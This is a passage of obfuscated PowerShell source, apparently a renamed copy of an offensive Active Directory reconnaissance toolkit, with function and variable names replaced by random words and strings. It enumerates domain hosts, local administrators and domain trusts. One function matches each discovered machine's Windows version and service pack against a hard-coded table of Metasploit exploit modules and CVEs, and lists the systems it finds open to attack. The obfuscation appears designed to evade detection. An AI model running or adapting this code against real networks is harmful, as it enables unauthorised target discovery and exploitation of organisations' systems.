            $kEneZcxTTiuFrPZ = Get-Content -Path $SCQMhcOm9CdDHJg
        }

        if(!$kEneZcxTTiuFrPZ) {
            [array]$kEneZcxTTiuFrPZ = @()

            if($KKbtTlEQY9KtTfJ) {
                $CJ9kiLTwFu9AGol = @($KKbtTlEQY9KtTfJ)
            }
            elseif($v9rPBuPmcvnoMAe) {

                $CJ9kiLTwFu9AGol = misdirects | ForEach-Object { $_.Name }
            }
            else {

                $CJ9kiLTwFu9AGol = @( (skulked).name )
            }

            ForEach ($KKbtTlEQY9KtTfJ in $CJ9kiLTwFu9AGol) {
                Write-Verbose "[*] Querying domain $KKbtTlEQY9KtTfJ for hosts"
                $kEneZcxTTiuFrPZ += Randal -DshCfudiWKUrQer $9vRumd9teqLmPVM -GazxKCLDhxrDzgZ $beLlanRpMptelSU -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv
            }
        

            $kEneZcxTTiuFrPZ = $kEneZcxTTiuFrPZ | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($kEneZcxTTiuFrPZ.Count) -eq 0) {
                throw "No hosts found!"
            }
        }


        $bn9LRoFkAwqTApM = {
            param($kEneZcxTTiuFrPZ, $Ping)

            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ
            }
            if($Up) {

                $DRQHrKvgP9zvjrr = birdwatcher -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ
                if ($DRQHrKvgP9zvjrr) {
                    $kEneZcxTTiuFrPZ
                }
            }
        }

    }

    process {

        if($rTpHnnlb99iPjvh) {
            Write-Verbose "Using threading with threads = $rTpHnnlb99iPjvh"


            $RKqdPQDaOeQqZwY = @{
                'Ping' = $(-not $Mt9YASUmJCaBvWu)
            }


            gamboled -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -wCnzjqnrBF9dvCj $bn9LRoFkAwqTApM -JOSAHQ9v9JGmPBt $RKqdPQDaOeQqZwY
        }

        else {
            if(-not $Mt9YASUmJCaBvWu -and ($kEneZcxTTiuFrPZ.count -ne 1)) {

                $Ping = {param($kEneZcxTTiuFrPZ) if(Test-Connection -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -Count 1 -Quiet -ErrorAction Stop){$kEneZcxTTiuFrPZ}}
                $kEneZcxTTiuFrPZ = gamboled -bybIu9FcWQYFgRT -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -wCnzjqnrBF9dvCj $Ping -rTpHnnlb99iPjvh 100
            }

            Write-Verbose "[*] Total number of active hosts: $($kEneZcxTTiuFrPZ.count)"
            $Y9qMKSVLp9NbaEl = 0

            ForEach ($SiEWnqfdNZWbTmF in $kEneZcxTTiuFrPZ) {

                $Y9qMKSVLp9NbaEl = $Y9qMKSVLp9NbaEl + 1


                Start-Sleep -Seconds $umE9IsWm9kKUGTC.Next((1-$ptfOJoCXzpSnNCJ)*$Delay, (1+$ptfOJoCXzpSnNCJ)*$Delay)

                Write-Verbose "[*] Enumerating server $SiEWnqfdNZWbTmF ($Y9qMKSVLp9NbaEl of $($kEneZcxTTiuFrPZ.count))"
                Invoke-Command -wCnzjqnrBF9dvCj $bn9LRoFkAwqTApM -ArgumentList $SiEWnqfdNZWbTmF, $False, $piSVdrubQFOiYrj, $DPhgmxhxe9wqqbN, $G9ILbECCwQieQCR
            }
        }
    }
}


function inset {

    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $kEneZcxTTiuFrPZ = '*',

        [String]
        $SPN,

        [String]
        $lVRTtGIBisoAexC = '*',

        [String]
        $jIyTIqaDLQPt9yn = '*',

        [String]
        $DshCfudiWKUrQer,

        [Switch]
        $Ping,

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [String]
        $GazxKCLDhxrDzgZ,

        [Switch]
        $tXJXRLTbTAiviMb,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )

    Write-Verbose "[*] Grabbing computer accounts from Active Directory..."


    $ihAHSnlkEfHk9yA = New-Object System.Data.DataTable 
    $Null = $ihAHSnlkEfHk9yA.Columns.Add('Hostname')       
    $Null = $ihAHSnlkEfHk9yA.Columns.Add('OperatingSystem')
    $Null = $ihAHSnlkEfHk9yA.Columns.Add('ServicePack')
    $Null = $ihAHSnlkEfHk9yA.Columns.Add('LastLogon')

    Randal -wD9BSmPbiJRFWDu @PSBoundParameters | ForEach-Object {

        $lbALVwQcAHVlWC9 = $_.dnshostname
        $mkwBJlGTw9btAUB = $_.operatingsystem
        $gTtOtEgmmchlUjt = $_.operatingsystemservicepack
        $sjUxtBPhA9HVZ9N = $_.lastlogon
        $ONHPShdbdyT9PeK = $_.useraccountcontrol

        $PW9OHN99bVIOZcd = [convert]::ToString($_.useraccountcontrol,2)


        $JjRxJmqzuYNZdPh = $PW9OHN99bVIOZcd.Length - 2
        $h9xXbmYYmZEEZhX = $PW9OHN99bVIOZcd.Substring($JjRxJmqzuYNZdPh,1)


        if ($h9xXbmYYmZEEZhX  -eq 0) {

            $Null = $ihAHSnlkEfHk9yA.Rows.Add($lbALVwQcAHVlWC9,$mkwBJlGTw9btAUB,$gTtOtEgmmchlUjt,$sjUxtBPhA9HVZ9N)
        }
    }


    Write-Verbose "[*] Loading exploit list for critical missing patches..."






    $wifbFXFlOPtfk9X = New-Object System.Data.DataTable 
    $Null = $wifbFXFlOPtfk9X.Columns.Add('OperatingSystem') 
    $Null = $wifbFXFlOPtfk9X.Columns.Add('ServicePack')
    $Null = $wifbFXFlOPtfk9X.Columns.Add('MsfModule')  
    $Null = $wifbFXFlOPtfk9X.Columns.Add('CVE')
    

    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows 7","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_070_wkssvc","http://www.cvedetails.com/cve/2006-4691")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","","exploit/windows/smb/ms05_039_pnp","http://www.cvedetails.com/cve/2005-1983")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2000","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2003","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2003","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2003","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2003","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2003 R2","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2003 R2","","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2003 R2","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2003 R2","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2008","Service Pack 2","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2008","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Server 2008 R2","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Vista","Service Pack 2","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Vista","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Vista","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows Vista","","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows XP","Server Pack 1","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows XP","Server Pack 1","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms05_039_pnp","http://www.cvedetails.com/cve/2005-1983")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows XP","Service Pack 2","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_070_wkssvc","http://www.cvedetails.com/cve/2006-4691")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows XP","Service Pack 3","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows XP","Service Pack 3","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows XP","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows XP","","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows XP","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
    $Null = $wifbFXFlOPtfk9X.Rows.Add("Windows XP","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  


    Write-Verbose "[*] Checking computers for vulnerable OS and SP levels..."






    $SM9vHWqUnCVSUzC = New-Object System.Data.DataTable 
    $Null = $SM9vHWqUnCVSUzC.Columns.Add('ComputerName')
    $Null = $SM9vHWqUnCVSUzC.Columns.Add('OperatingSystem')
    $Null = $SM9vHWqUnCVSUzC.Columns.Add('ServicePack')
    $Null = $SM9vHWqUnCVSUzC.Columns.Add('LastLogon')
    $Null = $SM9vHWqUnCVSUzC.Columns.Add('MsfModule')
    $Null = $SM9vHWqUnCVSUzC.Columns.Add('CVE')


    $wifbFXFlOPtfk9X | ForEach-Object {
                 
        $beyaHtOMBM9rUZV = $_.OperatingSystem
        $kyfLUvwVOvRwCu9 = $_.ServicePack
        $SIEUIZz9BAvVYlA = $_.MsfModule
        $9BcImNLoA9XgnSd = $_.CVE


        $ihAHSnlkEfHk9yA | ForEach-Object {
            
            $PEL9z9Qdo9dLvQr = $_.Hostname
            $AdsOS = $_.OperatingSystem
            $AdsSP = $_.ServicePack                                                        
            $Bg9BpL9yXtegXOn = $_.LastLogon
            

            if ($AdsOS -like "$beyaHtOMBM9rUZV*" -and $AdsSP -like "$kyfLUvwVOvRwCu9" ) {                    

                $Null = $SM9vHWqUnCVSUzC.Rows.Add($PEL9z9Qdo9dLvQr,$AdsOS,$AdsSP,$Bg9BpL9yXtegXOn,$SIEUIZz9BAvVYlA,$9BcImNLoA9XgnSd)
            }
        }
    }     
    

    $XpLVhvcmTWWOezc = $SM9vHWqUnCVSUzC | Select-Object ComputerName -Unique | Measure-Object
    $GbQAoyrfmdmtKuX = $XpLVhvcmTWWOezc.Count
    if ($XpLVhvcmTWWOezc.Count -gt 0) {

        Write-Verbose "[+] Found $GbQAoyrfmdmtKuX potentially vulnerable systems!"
        $SM9vHWqUnCVSUzC | Sort-Object { $_.lastlogon -as [datetime]} -Descending
    }
    else {
        Write-Verbose "[-] No vulnerable systems were found."
    }
}


function Capitoline {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $kEneZcxTTiuFrPZ,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $SCQMhcOm9CdDHJg,

        [String]
        $9vRumd9teqLmPVM,

        [String]
        $beLlanRpMptelSU,

        [Switch]
        $Mt9YASUmJCaBvWu,

        [UInt32]
        $Delay = 0,

        [Double]
        $ptfOJoCXzpSnNCJ = .3,

        [String]
        $piSVdrubQFOiYrj,

        [Switch]
        $n9ASL9GgkDycByX,

        [Switch]
        $ohnuBlWbvHAQYtA,

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [Switch]
        $v9rPBuPmcvnoMAe,

        [ValidateRange(1,100)] 
        [Int]
        $rTpHnnlb99iPjvh
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $LWin9zMVCuE99Q9 = 'Continue'
        }


        $umE9IsWm9kKUGTC = New-Object System.Random

        Write-Verbose "[*] Running Capitoline with delay of $Delay"


        if($SCQMhcOm9CdDHJg) {
            $kEneZcxTTiuFrPZ = Get-Content -Path $SCQMhcOm9CdDHJg
        }

        if(!$kEneZcxTTiuFrPZ) { 
            [array]$kEneZcxTTiuFrPZ = @()

            if($KKbtTlEQY9KtTfJ) {
                $CJ9kiLTwFu9AGol = @($KKbtTlEQY9KtTfJ)
            }
            elseif($v9rPBuPmcvnoMAe) {

                $CJ9kiLTwFu9AGol = misdirects | ForEach-Object { $_.Name }
            }
            else {

                $CJ9kiLTwFu9AGol = @( (skulked).name )
            }

            ForEach ($KKbtTlEQY9KtTfJ in $CJ9kiLTwFu9AGol) {
                Write-Verbose "[*] Querying domain $KKbtTlEQY9KtTfJ for hosts"
                $kEneZcxTTiuFrPZ += Randal -DshCfudiWKUrQer $9vRumd9teqLmPVM -GazxKCLDhxrDzgZ $beLlanRpMptelSU -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv
            }
            

            $kEneZcxTTiuFrPZ = $kEneZcxTTiuFrPZ | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($kEneZcxTTiuFrPZ.Count) -eq 0) {
                throw "No hosts found!"
            }
        }


        if(!$n9ASL9GgkDycByX) {
            if ($piSVdrubQFOiYrj -and (Test-Path -Path $piSVdrubQFOiYrj)) { Remove-Item -Path $piSVdrubQFOiYrj }
        }

        if($ohnuBlWbvHAQYtA) {
            
            Write-Verbose "Determining domain trust groups"


            $PezB9tBlVXC9XIl = condor -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv | ForEach-Object { $_.GroupName } | Sort-Object -Unique

            $G9ILbECCwQieQCR = $PezB9tBlVXC9XIl | ForEach-Object { 


                reapportioned -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -hIqWczrXxNjFAmP $_ -wD9BSmPbiJRFWDu | Where-Object { $_.objectsid -notmatch "S-1-5-32-544" } | ForEach-Object { $_.objectsid }
            }


            $DPhgmxhxe9wqqbN = drawer -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ
        }


        $bn9LRoFkAwqTApM = {
            param($kEneZcxTTiuFrPZ, $Ping, $piSVdrubQFOiYrj, $DPhgmxhxe9wqqbN, $G9ILbECCwQieQCR)


            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ
            }
            if($Up) {

                $XcOKldKrFFcvT9S = Brahms -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ


                if($DPhgmxhxe9wqqbN -and $GcNE9UzyXOWA9Do) {

                    $EcsUI9WmYB9f9ez = ($XcOKldKrFFcvT9S | Where-Object { $_.SID -match '.*-500$' }).SID -replace "-500$"



                    $XcOKldKrFFcvT9S = $XcOKldKrFFcvT9S | Where-Object { ($G9ILbECCwQieQCR -contains $_.SID) -or ((-not $_.SID.startsWith($EcsUI9WmYB9f9ez)) -and (-not $_.SID.startsWith($DPhgmxhxe9wqqbN))) }
                }

                if($XcOKldKrFFcvT9S -and ($XcOKldKrFFcvT9S.Length -ne 0)) {

                    if($piSVdrubQFOiYrj) {
                        $XcOKldKrFFcvT9S | flubbing -piSVdrubQFOiYrj $piSVdrubQFOiYrj
                    }
                    else {

                        $XcOKldKrFFcvT9S
                    }
                }
                else {
                    Write-Verbose "[!] No users returned from $JaseP9VXrHGQBRz"
                }
            }
        }

    }

    process {

        if($rTpHnnlb99iPjvh) {
            Write-Verbose "Using threading with threads = $rTpHnnlb99iPjvh"


            $RKqdPQDaOeQqZwY = @{
                'Ping' = $(-not $Mt9YASUmJCaBvWu)
                'OutFile' = $piSVdrubQFOiYrj
                'DomainSID' = $DPhgmxhxe9wqqbN
                'TrustGroupsSIDs' = $G9ILbECCwQieQCR
            }


            gamboled -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -wCnzjqnrBF9dvCj $bn9LRoFkAwqTApM -JOSAHQ9v9JGmPBt $RKqdPQDaOeQqZwY
        }

        else {
            if(-not $Mt9YASUmJCaBvWu -and ($kEneZcxTTiuFrPZ.count -ne 1)) {

                $Ping = {param($kEneZcxTTiuFrPZ) if(Test-Connection -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -Count 1 -Quiet -ErrorAction Stop){$kEneZcxTTiuFrPZ}}
                $kEneZcxTTiuFrPZ = gamboled -bybIu9FcWQYFgRT -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -wCnzjqnrBF9dvCj $Ping -rTpHnnlb99iPjvh 100
            }

            Write-Verbose "[*] Total number of active hosts: $($kEneZcxTTiuFrPZ.count)"
            $Y9qMKSVLp9NbaEl = 0

            ForEach ($SiEWnqfdNZWbTmF in $kEneZcxTTiuFrPZ) {

                $Y9qMKSVLp9NbaEl = $Y9qMKSVLp9NbaEl + 1


                Start-Sleep -Seconds $umE9IsWm9kKUGTC.Next((1-$ptfOJoCXzpSnNCJ)*$Delay, (1+$ptfOJoCXzpSnNCJ)*$Delay)

                Write-Verbose "[*] Enumerating server $SiEWnqfdNZWbTmF ($Y9qMKSVLp9NbaEl of $($kEneZcxTTiuFrPZ.count))"
                Invoke-Command -wCnzjqnrBF9dvCj $bn9LRoFkAwqTApM -ArgumentList $SiEWnqfdNZWbTmF, $False, $piSVdrubQFOiYrj, $DPhgmxhxe9wqqbN, $G9ILbECCwQieQCR
            }
        }
    }
}








function Trojans {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $KKbtTlEQY9KtTfJ = (skulked).Name,

        [String]
        $ewHsaEFeoXOCPPv,

        [Switch]
        $LDAP,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )

    process {
        if($LDAP -or $ewHsaEFeoXOCPPv) {

            $vVn9lqNZhX9IbmN = synonym -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK

            if($vVn9lqNZhX9IbmN) {

                $vVn9lqNZhX9IbmN.filter = '(&(objectClass=trustedDomain))'

                $vVn9lqNZhX9IbmN.FindAll() | Where-Object {$_} | ForEach-Object {
                    $Props = $_.Properties
                    $IvYVRooOOIHTjAr = New-Object PSObject
                    $9WMscV9KcKuJgxD = Switch ($Props.trustattributes)
                    {
                        0x001 { "non_transitive" }
                        0x002 { "uplevel_only" }
                        0x004 { "quarantined_domain" }
                        0x008 { "forest_transitive" }
                        0x010 { "cross_organization" }
                        0x020 { "within_forest" }
                        0x040 { "treat_as_external" }
                        0x080 { "trust_uses_rc4_encryption" }
                        0x100 { "trust_uses_aes_keys" }
                        Default { 
                            Write-Warning "Unknown trust attribute: $($Props.trustattributes)";
                            "$($Props.trustattributes)";
                        }
                    }
                    $f9VB9qwyURaXnzv = Switch ($Props.trustdirection) {
                        0 { "Disabled" }
                        1 { "Inbound" }
                        2 { "Outbound" }
                        3 { "Bidirectional" }
                    }
                    $OV9LZahKFDcoNLH = New-Object Guid @(,$Props.objectguid[0])
                    $IvYVRooOOIHTjAr | Add-Member Noteproperty 'SourceName' $KKbtTlEQY9KtTfJ
                    $IvYVRooOOIHTjAr | Add-Member Noteproperty 'TargetName' $Props.name[0]
                    $IvYVRooOOIHTjAr | Add-Member Noteproperty 'ObjectGuid' "{$OV9LZahKFDcoNLH}"
                    $IvYVRooOOIHTjAr | Add-Member Noteproperty 'TrustType' "$9WMscV9KcKuJgxD"
                    $IvYVRooOOIHTjAr | Add-Member Noteproperty 'TrustDirection' "$f9VB9qwyURaXnzv"
                    $IvYVRooOOIHTjAr
                }
            }
        }

        else {

            $xJgvwcdGvZSwwyk = skulked -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ
            
            if($xJgvwcdGvZSwwyk) {
